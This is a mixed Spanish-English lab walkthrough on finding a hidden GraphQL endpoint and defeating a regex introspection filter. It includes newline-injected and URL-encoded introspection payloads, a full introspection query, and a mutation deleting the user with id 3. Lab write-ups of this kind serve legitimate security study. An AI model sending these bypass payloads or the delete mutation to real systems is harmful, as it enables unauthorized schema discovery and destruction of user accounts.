---
title: "3 - Finding a hidden GraphQL endpoint (& Bypassing Introspection defenses)"
---

# 3 - Finding a hidden GraphQL endpoint (& Bypassing Introspection defenses)

Si la instrospección está habilitada : https://github.com/APIs-guru/graphql-voyager

Buscamos el endpoint usando GET y POST

/graphql
/graphiql
/graphql.php
/graphql/console
/api
/api/graphql
/graphql/api
/graphql/graphql

y poniendo /v1 y usando application/json

Usando una query universal : `query{__typename}`

Si le enviamos una Introspection query :

```json
{
  "errors": [
    {
      "locations": [],
      "message": "GraphQL introspection is not allowed, but the query contained __schema or __type"
    }
  ]
}
```

Ahora vamos a bypassear la defensa contra instrospección:

## Bypassing GraphQL introspection defenses

If you cannot get introspection queries to run for the API you are testing, try inserting a special character after the `__schema` keyword.

When developers disable introspection, they could use a regex to exclude the `__schema` keyword in queries. You should try characters like spaces, new lines and commas, as they are ignored by GraphQL but not by flawed regex.

As such, if the developer has only excluded `__schema{`, then the below introspection query would not be excluded.

```json

    #Introspection query with newline

    {
        "query": "query{__schema
        {queryType{name}}}"
    }

```

If this doesn't work, try running the probe over an alternative request method, as introspection may only be disabled over POST. Try a GET request, or a POST request with a content-type of `x-www-form-urlencoded`.

The example below shows an introspection probe sent via GET, with URL-encoded parameters.

```
 # Introspection probe as GET request
    GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

Solución : 
Si lo enviamos así nos da error

```json
{
    "query": "query { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"
}
```

Si lo enviamos así (salto de línea y retorno de carro después de __schema) : 

``` json
{
    "query": "query { __schema\r\n
     { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"
}
```

Funciona

Enviando

```json
{
    "query": "query { getUser(id: 1) { id username  } }"
}
```

```json
{
  "data": {
    "getUser": {
      "id": 1,
      "username": "administrator"
    }
  }
}
```

==Para eliminar al usuario con Id=3==

Dado que el tipo de respuesta `DeleteOrganizationUserResponse` tiene un campo llamado `user` que es de tipo `User`, puedes solicitar información adicional sobre el usuario eliminado al hacer la mutación `deleteOrganizationUser`. Aquí tienes un ejemplo de cómo realizar la mutación para eliminar un usuario y obtener información sobre el usuario eliminado en la respuesta.

### Ejemplo de mutación `deleteOrganizationUser`

```json
{
    "query": "mutation { deleteOrganizationUser(input: { id : 3 }) { user { id username } } }"
}
```

### Explicación

- **deleteOrganizationUser**: Es el nombre de la mutación que elimina al usuario.
- **input**: Es el argumento que necesita la mutación, y debe seguir la estructura de `DeleteOrganizationUserInput`. ==(indicar un id)==
  - **id**: El identificador del usuario que deseas eliminar. Sustituye `123` por el ID real del usuario.
- **user**: Este campo en la respuesta representa el usuario que fue eliminado ==(debe seguir la estructura de DeleteOrganizationUserResponse)==
  - **id, username Campos de información del usuario eliminado que solicitamos como ejemplo. Puedes cambiar o agregar otros campos según lo permita el tipo `User` en tu esquema.
